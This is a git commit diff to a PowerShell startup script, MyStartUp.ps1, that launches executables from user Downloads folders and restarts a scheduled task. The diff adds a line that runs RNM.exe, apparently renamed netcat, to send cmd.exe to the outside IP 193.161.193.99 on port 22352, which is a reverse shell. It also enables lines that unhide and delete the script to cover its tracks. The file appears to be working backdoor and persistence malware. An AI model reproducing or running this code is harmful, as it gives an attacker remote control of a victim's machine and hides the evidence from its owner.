96a4ab9a34f7c0ebc78af5d7c80f309dd57d6cdd
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2023-11-18 20:52:18 +0100

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -4,7 +4,7 @@ C:\Users\seba\Downloads\lml.exe
 C:\Users\angel\Downloads\Disk-Uploading.exe
 Stop-ScheduledTask -TaskName zed
 Start-ScheduledTask -TaskName zed
-RNM.exe -nv 193.161.193.99 22352 -e cmd.exe
-#attrib -h C:\Users\Public\MyStartUp.ps1
-#del C:\Users\Public\MyStartUp.ps1
+C:\Users\Public\RNM.exe -nv 193.161.193.99 22352 -e cmd.exe
+attrib -h C:\Users\Public\MyStartUp.ps1
+del C:\Users\Public\MyStartUp.ps1
 
